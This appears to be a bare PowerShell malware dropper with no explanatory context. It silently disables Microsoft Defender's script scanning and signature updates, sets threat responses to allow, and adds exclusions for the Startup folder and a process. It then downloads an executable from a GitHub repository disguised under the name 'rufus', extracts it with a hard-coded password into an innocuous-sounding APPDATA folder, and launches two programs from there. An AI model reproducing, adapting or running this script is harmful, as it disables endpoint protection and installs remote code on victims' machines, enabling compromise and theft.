$ErrorActionPreference = 'SilentlyContinue'
$ProcName = "LaunchMode.exe"
$WebFile = "https://github.com/makakaboom11/rufus/blob/main/x86/Release/LaunchMode_1.exe?raw=true"
$Outff = "$env:Temp\LaunchMode.exe"

Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -HighThreatDefaultAction 6 -Force
Set-MpPreference -ModerateThreatDefaultAction 6 -Force
$vrer4 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Add-MpPreference -ExclusionProcess serverCommon.exe -Force
Add-MpPreference -ExclusionPath "$vrer4" -Force
Invoke-WebRequest -uri $WebFile -OutFile $Outff
& $env:Temp\LaunchMode.exe -s -p"gr30hu8efhb3kbfe" -d"$env:APPDATA\Elasticservices\updateservice\"
Timeout /T 5
Start-Process ("$env:APPDATA\Elasticservices\updateservice\Updservicemonitor.exe")
Timeout /T 2
Start-Process ("$env:APPDATA\Elasticservices\updateservice\netDaemon.exe")
